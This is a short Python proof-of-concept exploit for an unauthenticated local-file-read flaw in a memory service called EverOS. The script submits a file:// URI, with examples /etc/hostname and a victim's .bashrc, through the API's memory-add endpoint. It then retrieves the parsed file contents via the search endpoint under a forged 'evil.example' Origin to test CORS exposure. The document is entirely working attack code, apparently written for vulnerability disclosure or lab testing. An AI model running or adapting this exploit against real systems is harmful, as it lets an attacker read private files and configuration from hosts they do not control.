#!/usr/bin/env python3
"""EverOS local-file read PoC (direct API, no auth).

Usage:
  python3 everos_file_read.py --file file:///etc/hostname
  python3 everos_file_read.py --file file:///home/victim/.bashrc --base http://127.0.0.1:18777

Requires [multimodal] api_key/base_url configured on the victim instance
(parser enabled). Non-destructive against the lab: adds one memory row.
"""
import argparse
import json
import time
import urllib.request


def post(base, path, body, origin="https://evil.example"):
    req = urllib.request.Request(
        base + path,
        data=json.dumps(body).encode(),
        headers={"Content-Type": "application/json", "Origin": origin},
        method="POST",
    )
    with urllib.request.urlopen(req, timeout=30) as r:
        return r.status, dict(r.headers), json.loads(r.read())


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--base", default="http://127.0.0.1:18777")
    ap.add_argument("--file", default="file:///etc/hostname")
    ap.add_argument("--session", default="poc-" + str(int(time.time())))
    ap.add_argument("--origin", default="https://evil.example")
    a = ap.parse_args()

    status, hdrs, body = post(a.base, "/api/v2/memory/add", {
        "session_id": a.session,
        "messages": [{
            "sender_id": "u1", "role": "user", "timestamp": int(time.time() * 1000),
            "content": [{"type": "doc", "name": "x.txt", "uri": a.file, "ext": "txt"}],
        }],
        "defer_extraction": True,
    }, a.origin)
    print("[add] %s ACAO=%s ACAC=%s %s" % (
        status, hdrs.get("access-control-allow-origin"),
        hdrs.get("access-control-allow-credentials"), body))

    status, hdrs, body = post(a.base, "/api/v2/memory/search", {
        "user_id": "attacker", "query": "x", "method": "keyword",
        "filters": {"session_id": a.session},
    }, a.origin)
    rows = body.get("data", {}).get("unprocessed_messages", [])
    parsed = rows[0]["content"][0].get("parsed_content") if rows else None
    print("[search] %s ACAO=%s parsed_content=%r" % (
        status, hdrs.get("access-control-allow-origin"), parsed))


if __name__ == "__main__":
    main()
